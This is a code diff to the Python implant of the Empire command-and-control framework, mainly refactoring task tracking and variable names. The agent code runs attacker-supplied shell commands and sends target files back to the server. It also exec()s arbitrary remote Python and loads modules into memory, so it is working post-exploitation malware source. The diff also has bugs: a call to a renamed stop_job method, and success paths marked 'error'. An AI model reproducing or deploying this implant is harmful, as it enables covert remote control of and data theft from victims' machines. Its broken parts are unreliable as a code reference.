+++ empire/server/data/agent/agent.py
@@ -8,6 +8,7 @@ import numbers
 import os
 import platform
 import pwd
+import queue as Queue
 import random
 import re
 import shutil
@@ -354,10 +355,10 @@ class MainAgent:
         self.defaultResponse = base64.b64decode("")
         self.packet_handler.missedCheckins = 0
         self.sessionID = session_id
-        self.jobMessageBuffer = ""
+        self.job_message_buffer = ""
         self.socksthread = False
         self.socksqueue = None
-        self.jobs = {}
+        self.tasks = {}
 
         parts = self.profile.split("|")
         self.userAgent = parts[1]
@@ -379,24 +380,23 @@ class MainAgent:
 
     def agent_exit(self):
         # exit for proper job / thread cleanup
-        if len(self.jobs) > 0:
+        if len(self.tasks) > 0:
             try:
-                for x in self.jobs:
-                    self.jobs[x].kill()
-                    self.jobs.pop(x)
+                for x in self.tasks:
+                    self.tasks[x]['thread'].kill()
             except:
                 # die hard if thread kill fails
                 pass
         sys.exit()
 
     def send_job_message_buffer(self):
-        if len(self.jobs) > 0:
+        if self.job_message_buffer != "":
             result = self.get_job_message_buffer()
             self.packet_handler.process_job_tasking(result)
         else:
             pass
 
-    def run_prebuilt_command(self, data, resultID):
+    def run_prebuilt_command(self, data, result_id):
         """
         Run a command on the system and return the results.
         Task 40
@@ -404,15 +404,16 @@ class MainAgent:
         parts = data.split(" ")
         if len(parts) == 1:
             data = parts[0]
-            resultData = str(self.run_command(data))
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, resultData, resultID))
+            result_data = str(self.run_command(data))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, result_data, result_id))
         else:
             cmd = parts[0]
             cmdargs = " ".join(parts[1: len(parts)])
-            resultData = str(self.run_command(cmd, cmdargs=cmdargs))
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, resultData, resultID))
+            result_data = str(self.run_command(cmd, cmdargs=cmdargs))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, result_data, result_id))
+        self.tasks[result_id]["status"] = "completed"
 
-    def file_download(self, data, resultID):
+    def file_download(self, data, result_id):
         """
         Download a file from the server.
         Task 41
@@ -422,7 +423,7 @@ class MainAgent:
         if not os.path.exists(objPath):
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    40, "file does not exist or cannot be accessed", resultID
+                    40, "file does not exist or cannot be accessed", result_id
                 )
             )
 
@@ -455,7 +456,7 @@ class MainAgent:
                 if not encodedPart or encodedPart == "" or len(encodedPart) == 16:
                     break
 
-                self.packet_handler.send_message(self.packet_handler.build_response_packet(41, partData, resultID))
+                self.packet_handler.send_message(self.packet_handler.build_response_packet(41, partData, result_id))
 
                 minSleep = int((1.0 - self.jitter) * self.delay)
                 maxSleep = int((1.0 + self.jitter) * self.delay)
@@ -463,8 +464,9 @@ class MainAgent:
                 time.sleep(sleepTime)
                 partIndex += 1
                 offset += 512000
+        self.tasks[result_id]["status"] = "completed"
 
-    def file_upload(self, data, resultID):
+    def file_upload(self, data, result_id):
         """
         Upload a file to the server.
         Task 42
@@ -478,20 +480,22 @@ class MainAgent:
                 f.write(raw)
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    42, "[*] Upload of %s successful" % (filePath), resultID
+                    42, "[*] Upload of %s successful" % (filePath), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "completed"
         except Exception as e:
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
                     0,
                     "[!] Error in writing file %s during upload: %s"
                     % (filePath, str(e)),
-                    resultID,
+                    result_id,
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def directory_list(self, data, resultID):
+    def directory_list(self, data, result_id):
         """
         List a directory on the target.
         Task 43
@@ -508,7 +512,7 @@ class MainAgent:
         if not os.path.isdir(path):
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    43, "Directory {} not found.".format(path), resultID
+                    43, "Directory {} not found.".format(path), result_id
                 )
             )
         items = []
@@ -526,61 +530,92 @@ class MainAgent:
             }
         )
 
-        self.packet_handler.send_message(self.packet_handler.build_response_packet(43, result_data, resultID))
+        self.packet_handler.send_message(self.packet_handler.build_response_packet(43, result_data, result_id))
+        self.tasks[result_id]["status"] = "completed"
 
-    def csharp_execute(self, data, resultID):
+    def csharp_execute(self, data, result_id):
         """
         Execute C# module in ironpython using reflection
         Task 44
         """
         self.packet_handler.send_message(
             self.packet_handler.build_response_packet(
-                44, "[!] C# module execution not implemented", resultID
+                44, "[!] C# module execution not implemented", result_id
             )
         )
+        self.tasks[result_id]["status"] = "unimplemented"
 
-    def job_list(self, resultID):
+    def job_list(self, result_id):
         """
-        Return a list of all running agent.jobs.
+        Return a list of all running agent jobs as a formatted table.
+        TODO: Return JSON instead of a table.
         Task 50
         """
-        msg = "Active agent.jobs:\n"
+        self.tasks[result_id]["status"] = "completed"
 
-        for key in self.jobs:
-            msg += "Task %s" % key
-        self.packet_handler.send_message(self.packet_handler.build_response_packet(50, msg, resultID))
+        filtered_tasks = {
+            task_id: {
+                "status": task_info.get("status", "N/A")
+            } for task_id, task_info in self.tasks.items()
+        }
 
-    def stop_job(self, jobID, resultID):
+        headers = ["Task ID", "Status"]
+        rows = [[task_id, task_info["status"]] for task_id, task_info in filtered_tasks.items()]
+        column_widths = [max(len(str(item)) for item in col) for col in zip(*([headers] + rows))]
+        separator = ' | '.join('-' * width for width in column_widths)
+        header_line = ' | '.join(headers[i].ljust(column_widths[i]) for i in range(len(headers)))
+
+        table_lines = [header_line, separator]
+        for row in rows:
+            row_line = ' | '.join(str(row[i]).ljust(column_widths[i]) for i in range(len(row)))
+            table_lines.append(row_line)
+
+        tasks_table = '\n'.join(table_lines)
+        self.packet_handler.send_message(self.packet_handler.build_response_packet(50, tasks_table, result_id))
+
+    def stop_task(self, job_to_kill, result_id):
         """
         Stop a running job.
         Task 51
         """
         try:
-            self.jobs[int(jobID)].kill()
-            self.jobs.pop(int(jobID))
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    51, "[+] Job thread %s stopped successfully" % (jobID), resultID
+            if self.tasks[job_to_kill]['thread'].is_alive():
+                self.tasks[job_to_kill]['thread'].kill()
+                self.tasks[job_to_kill]['status'] = "stopped"
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(
+                        51, "[+] Job thread %s stopped successfully" % (job_to_kill), result_id
+                    )
                 )
-            )
+            else:
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(
+                        51, "[!] Job thread %s already stopped" % (job_to_kill), result_id
+                    )
+                )
+
+            self.tasks[result_id]["status"] = "completed"
+
         except Exception as e:
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    51, "[!] Error stopping job thread: %s" % (e), resultID
+                    51, "[!] Error stopping job thread: %s" % (e), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
 
-    def start_smb_pipe_server(self, data, resultID):
+    def start_smb_pipe_server(self, data, result_id):
         """
         Start an SMB pipe server on the target.
         Task 70
         """
         self.packet_handler.send_message(
-            self.packet_handler.build_response_packet(70, "[!] SMB server not support in Python agent", resultID)
+            self.packet_handler.build_response_packet(70, "[!] SMB server not support in Python agent", result_id)
         )
+        self.tasks[result_id]["status"] = "unimplemented"
 
-    def dynamic_code_execute_wait_nosave(self, data, resultID):
+    def dynamic_code_execute_wait_nosave(self, data, result_id):
         """
         Execute dynamic code and wait for the results without saving output.
         Task 100
@@ -592,17 +627,20 @@ class MainAgent:
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
             results = buffer.getvalue()
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(100, str(results), resultID))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(100, str(results), result_id))
+            self.tasks[result_id]["status"] = "completed"
+
         except Exception as e:
             errorData = str(buffer.getvalue())
             return self.packet_handler.build_response_packet(
                 0,
                 "error executing specified Python data: %s \nBuffer data recovered:\n%s"
                 % (e, errorData),
-                resultID,
+                result_id,
             )
+        self.tasks[result_id]["status"] = "error"
 
-    def dynamic_code_execution_wait_save(self, data, resultID):
+    def dynamic_code_execution_wait_save(self, data, result_id):
         """
         Execute dynamic code and wait for the results while saving output.
         Task 101
@@ -628,9 +666,11 @@ class MainAgent:
                     "{0: <15}".format(prefix)
                     + "{0: <5}".format(extension)
                     + encodedPart,
-                    resultID,
+                    result_id,
                 )
             )
+            self.tasks[result_id]["status"] = "completed"
+
         except Exception as e:
             # Also return partial code that has been executed
             errorData = buffer.getvalue()
@@ -639,11 +679,13 @@ class MainAgent:
                     0,
                     "error executing specified Python data %s \nBuffer data recovered:\n%s"
                     % (e, errorData),
-                    resultID,
+                    result_id,
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def disk_code_execution_wait_save(self, data, resultID):
+
+    def disk_code_execution_wait_save(self, data, result_id):
         """
         Execute on disk code and wait for the results while saving output.
         For modules that require multiprocessing not supported by exec
@@ -674,7 +716,9 @@ class MainAgent:
                 result += "\n\nError removing module file, please verify path: " + str(
                     implantPath
                 )
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(100, str(result), resultID))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(100, str(result), result_id))
+            self.tasks[result_id]["status"] = "completed"
+
         except Exception as e:
             fileCheck = os.path.isfile(implantPath)
             if fileCheck:
@@ -683,32 +727,35 @@ class MainAgent:
                         0,
                         "error executing specified Python data: %s \nError removing module file, please verify path: %s"
                         % (e, implantPath),
-                        resultID,
+                        result_id,
                     )
                 )
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    0, "error executing specified Python data: %s" % (e), resultID
+                    0, "error executing specified Python data: %s" % (e), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def powershell_task(self, data, resultID):
+    def powershell_task(self, data, result_id):
         """
         Execute a PowerShell command.
         Task 112
         """
-        result_packet = self.packet_handler.build_response_packet(110, "[!] PowerShell tasks not implemented", resultID)
+        result_packet = self.packet_handler.build_response_packet(110, "[!] PowerShell tasks not implemented", result_id)
         self.packet_handler.process_job_tasking(result_packet)
+        self.tasks[result_id]["status"] = "unimplemented"
 
-    def powershell_task_dyanmic_code_wait_nosave(self, data, resultID):
+    def powershell_task_dyanmic_code_wait_nosave(self, data, result_id):
         """
         Execute a PowerShell command and wait for the results without saving output.
         Task 118
         """
-        result_packet = self.packet_handler.build_response_packet(110, "[!] PowerShell tasks not implemented", resultID)
+        result_packet = self.packet_handler.build_response_packet(110, "[!] PowerShell tasks not implemented", result_id)
         self.packet_handler.process_job_tasking(result_packet)
+        self.tasks[result_id]["status"] = "unimplemented"
 
-    def script_command(self, data, resultID):
+    def script_command(self, data, result_id):
         """
         Execute a base64 encoded script.
         Task 121
@@ -721,7 +768,9 @@ class MainAgent:
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
             result = str(buffer.getvalue())
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(121, result, resultID))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(121, result, result_id))
+            self.tasks[result_id]["status"] = "completed"
+
         except Exception as e:
             errorData = str(buffer.getvalue())
             self.packet_handler.send_message(
@@ -729,11 +778,12 @@ class MainAgent:
                     0,
                     "error executing specified Python data %s \nBuffer data recovered:\n%s"
                     % (e, errorData),
-                    resultID,
+                    result_id,
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def script_load(self, data, resultID):
+    def script_load(self, data, result_id):
         """
         Load a script into memory.
         Task 122
@@ -748,22 +798,25 @@ class MainAgent:
             if not dec_data["crc32_check"]:
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
-                        122, "Failed crc32_check during decompression", resultID
+                        122, "Failed crc32_check during decompression", result_id
                     )
                 )
+                self.tasks[result_id]["status"] = "error"
+
         except Exception as e:
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    122, "Unable to decompress zip file: %s" % (e), resultID
+                    122, "Unable to decompress zip file: %s" % (e), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
         zdata = dec_data["data"]
         zf = zipfile.ZipFile(io.BytesIO(zdata), "r")
         if fileName in list(moduleRepo.keys()):
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    122, "%s module already exists" % (fileName), resultID
+                    122, "%s module already exists" % (fileName), result_id
                 )
             )
         else:
@@ -771,11 +824,12 @@ class MainAgent:
             self.install_hook(fileName)
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    122, "Successfully imported %s" % (fileName), resultID
+                    122, "Successfully imported %s" % (fileName), result_id
                 )
             )
+        self.tasks[result_id]["status"] = "completed"
 
-    def view_loaded_modules(self, data, resultID):
+    def view_loaded_modules(self, data, result_id):
         """
         View loaded modules.
         Task 123
@@ -788,17 +842,22 @@ class MainAgent:
                 loadedModules += "\n----" + key + "----\n"
                 loadedModules += "\n".join(moduleRepo[key].namelist())
 
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(123, loadedModules, resultID))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(123, loadedModules, result_id))
+            self.tasks[result_id]["status"] = "completed"
+
         else:
             try:
                 loadedModules = "\n----" + repoName + "----\n"
                 loadedModules += "\n".join(moduleRepo[repoName].namelist())
-                self.packet_handler.send_message(self.packet_handler.build_response_packet(123, loadedModules, resultID))
+                self.packet_handler.send_message(self.packet_handler.build_response_packet(123, loadedModules, result_id))
+                self.tasks[result_id]["status"] = "completed"
+
             except Exception as e:
                 msg = "Unable to retrieve repo contents: %s" % (str(e))
-                self.packet_handler.send_message(self.packet_handler.build_response_packet(123, msg, resultID))
+                self.packet_handler.send_message(self.packet_handler.build_response_packet(123, msg, result_id))
+                self.tasks[result_id]["status"] = "error"
 
-    def remove_module(self, data, resultID):
+    def remove_module(self, data, result_id):
         """
         Remove a module.
         """
@@ -808,34 +867,38 @@ class MainAgent:
             del moduleRepo[repoName]
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    124, "Successfully remove repo: %s" % (repoName), resultID
+                    124, "Successfully remove repo: %s" % (repoName), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "completed"
+
         except Exception as e:
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    124, "Unable to remove repo: %s, %s" % (repoName, str(e)), resultID
+                    124, "Unable to remove repo: %s, %s" % (repoName, str(e)), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def start_job(self, code, resultID):
+    def start_python_job(self, code, result_id):
         # create a new code block with a defined method name
-        codeBlock = "def method():\n" + indent(code[1:])
+        code_block = "def method():\n" + indent(code)
 
         # register the code block
-        code_obj = compile(codeBlock, "<string>", "exec")
+        code_obj = compile(code_block, "<string>", "exec")
         # code needs to be in the global listing
         # not the locals() scope
         exec(code_obj, globals())
 
         # create/process Packet start/return the thread
         # call the job_func so sys data can be captured
-        codeThread = KThread(target=self.job_func, args=(resultID,))
-        codeThread.start()
+        code_thread = KThread(target=self.python_job_func, args=(result_id,))
+        code_thread.start()
 
-        self.jobs[resultID] = codeThread
+        self.tasks[result_id]['thread'] = code_thread
+        self.tasks[result_id]["status"] = "running"
 
-    def job_func(self, resultID):
+    def python_job_func(self, result_id):
         try:
             buffer = StringIO()
             sys.stdout = buffer
@@ -843,25 +906,28 @@ class MainAgent:
             # and capture the output via sys
             method()
             sys.stdout = sys.__stdout__
-            dataStats_2 = buffer.getvalue()
-            result = self.packet_handler.build_response_packet(110, str(dataStats_2), resultID)
+            data_stats = buffer.getvalue()
+            result = self.packet_handler.build_response_packet(110, str(data_stats), result_id)
             self.packet_handler.process_job_tasking(result)
+            self.tasks[result_id]["status"] = "completed"
+
         except Exception as e:
             p = "error executing specified Python job data: " + str(e)
-            result = self.packet_handler.build_response_packet(0, p, resultID)
+            result = self.packet_handler.build_response_packet(0, p, result_id)
             self.packet_handler.process_job_tasking(result)
+            self.tasks[result_id]["status"] = "error"
 
     def job_message_buffer(self, message):
         # Supports job messages for checkin
         try:
-            self.jobMessageBuffer += str(message)
+            self.job_message_buffer += str(message)
         except Exception as e:
-            print(e)
+            print("[!] Error adding job output to buffer: %s" % (e))
 
     def get_job_message_buffer(self):
         try:
-            result = self.packet_handler.build_response_packet(110, str(self.jobMessageBuffer))
-            self.jobMessageBuffer = ""
+            result = self.packet_handler.build_response_packet(110, str(self.job_message_buffer))
+            self.job_message_buffer = ""
             return result
         except Exception as e:
             return self.packet_handler.build_response_packet(0, "[!] Error getting job output: %s" % (e))
@@ -1094,121 +1160,151 @@ class MainAgent:
         nonce, server, '', username, hostname, internalIP, osDetails, highIntegrity, processName, processID, language,
         pyVersion, architecture)
 
-    def process_packet(self, packetType, data, resultID):
+    def process_packet(self, packet_type, data, result_id):
         try:
-            packetType = int(packetType)
+            packet_type = int(packet_type)
+            if packet_type == 61:
+                # Avoids tracking temp tasks
+                self.socksqueue.put(base64.b64decode(data.encode("UTF-8")))
+                return
+
+            else:
+                self.tasks[result_id] = {
+                    "result_id": result_id,
+                    "packet_type": packet_type,
+                    "status": "started",
+                    "thread": None,
+                    "language": None,
+                    "powershell":
+                        {
+                            "app_domain": None,
+                            "ps_host": None,
+                            "buffer": None,
+                            "ps_host_exec": None
+                        }
+                }
+
+            if packet_type == 1:
+                # sysinfo request
+                # get_sysinfo should be exposed from stager.py
+                self.packet_handler.send_message(self.packet_handler.build_response_packet(1, self.get_sysinfo(server=self.server), result_id))
+                self.tasks[result_id]["status"] = "completed"
+
+            elif packet_type == 2:
+                # agent exit
+                self.packet_handler.send_message(self.packet_handler.build_response_packet(2, "", result_id))
+                self.agent_exit()
+
+            elif packet_type == 34:
+                # TASK_SET_PROXY
+                self.tasks[result_id]["status"] = "unimplemented"
+                pass
+
+            elif packet_type == 40:
+                self.run_prebuilt_command(data, result_id)
+
+            elif packet_type == 41:
+                self.file_download(data, result_id)
+
+            elif packet_type == 42:
+                self.file_upload(data, result_id)
+
+            elif packet_type == 43:
+                self.directory_list(data, result_id)
+
+            elif packet_type == 44:
+                self.csharp_execute(data, result_id)
+
+            elif packet_type == 50:
+                self.job_list(result_id)
+
+            elif packet_type == 51:
+                self.stop_job(data, result_id)
+
+            elif packet_type == 60:
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(
+                        0, "[!] SOCKS Server not implemented", result_id
+                    )
+                )
+
+            elif packet_type == 61:
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(
+                        0, "[!] SOCKS Server not implemented", result_id
+                    )
+                )
+
+            elif packet_type == 70:
+                self.start_smb_pipe_server(data, result_id)
+
+            elif packet_type == 100:
+                self.dynamic_code_execute_wait_nosave(data, result_id)
+
+            elif packet_type == 101:
+                self.dynamic_code_execution_wait_save(data, result_id)
+
+            elif packet_type == 102:
+                self.disk_code_execution_wait_save(data, result_id)
+
+            elif packet_type == 110:
+                self.start_python_job(data, result_id)
+
+            elif packet_type == 111:
+                # TASK_CMD_JOB_SAVE
+                self.tasks[result_id]["status"] = "unimplemented"
+                pass
+
+            elif packet_type == 112:
+                self.powershell_task(data, result_id)
+
+            elif packet_type == 118:
+                self.powershell_task_dyanmic_code_wait_nosave(data, result_id)
+
+            elif packet_type == 119:
+                self.tasks[result_id]["status"] = "unimplemented"
+                pass
+
+            elif packet_type == 121:
+                self.script_command(data, result_id)
+
+            elif packet_type == 122:
+                self.script_load(data, result_id)
+
+            elif packet_type == 123:
+                self.view_loaded_modules(data, result_id)
+
+            elif packet_type == 124:
+                self.remove_module(data, result_id)
+
+            elif packet_type == 130:
+                # Dynamically update agent comms
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(
+                        0, "[!] Switch agent comms not implemented", result_id
+                    )
+                )
+                self.tasks[result_id]["status"] = "unimplemented"
+
+            elif packet_type == 131:
+                # Update the listener name variable
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(
+                        0, "[!] Switch agent comms not implemented", result_id
+                    )
+                )
+                self.tasks[result_id]["status"] = "unimplemented"
+
+            else:
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(0, "invalid tasking ID: %s" % (packet_type), result_id)
+                )
+                self.tasks[result_id]["status"] = "error"
         except Exception as e:
-            return None
-
-        if packetType == 1:
-            # sysinfo request
-            # get_sysinfo should be exposed from stager.py
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(1, self.get_sysinfo(server=self.server), resultID))
-
-        elif packetType == 2:
-            # agent exit
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(2, "", resultID))
-            self.agent_exit()
-
-        elif packetType == 34:
-            # TASK_SET_PROXY
-            pass
-
-        elif packetType == 40:
-            self.run_prebuilt_command(data, resultID)
-
-        elif packetType == 41:
-            self.file_download(data, resultID)
-
-        elif packetType == 42:
-            self.file_upload(data, resultID)
-
-        elif packetType == 43:
-            self.directory_list(data, resultID)
-
-        elif packetType == 44:
-            self.csharp_execute(data, resultID)
-
-        elif packetType == 50:
-            self.job_list(resultID)
-
-        elif packetType == 51:
-            self.stop_job(data, resultID)
-
-        elif packetType == 60:
             self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    0, "[!] SOCKS Server not implemented", resultID
-                )
+                self.packet_handler.build_response_packet(0, "error processing packet: %s" % (e), result_id)
             )
-
-        elif packetType == 61:
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    0, "[!] SOCKS Server not implemented", resultID
-                )
-            )
-
-        elif packetType == 70:
-            self.start_smb_pipe_server(data, resultID)
-
-        elif packetType == 100:
-            self.dynamic_code_execute_wait_nosave(data, resultID)
-
-        elif packetType == 101:
-            self.dynamic_code_execution_wait_save(data, resultID)
-
-        elif packetType == 102:
-            self.disk_code_execution_wait_save(data, resultID)
-
-        elif packetType == 110:
-            self.start_job(data, resultID)
-
-        elif packetType == 111:
-            # TASK_CMD_JOB_SAVE
-            pass
-
-        elif packetType == 112:
-            self.powershell_task(data, resultID)
-
-        elif packetType == 118:
-            self.powershell_task_dyanmic_code_wait_nosave(data, resultID)
-
-        elif packetType == 119:
-            pass
-
-        elif packetType == 121:
-            self.script_command(data, resultID)
-
-        elif packetType == 122:
-            self.script_load(data, resultID)
-
-        elif packetType == 123:
-            self.view_loaded_modules(data, resultID)
-
-        elif packetType == 124:
-            self.remove_module(data, resultID)
-
-        elif packetType == 130:
-            # Dynamically update agent comms
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    0, "[!] Switch agent comms not implemented", resultID
-                )
-            )
-
-        elif packetType == 131:
-            # Update the listener name variable
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    0, "[!] Switch agent comms not implemented", resultID
-                )
-            )
-
-        else:
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(0, "invalid tasking ID: %s" % (packetType), resultID)
-            )
+            self.tasks[result_id]["status"] = "error"
 
     def run(self):
         while True: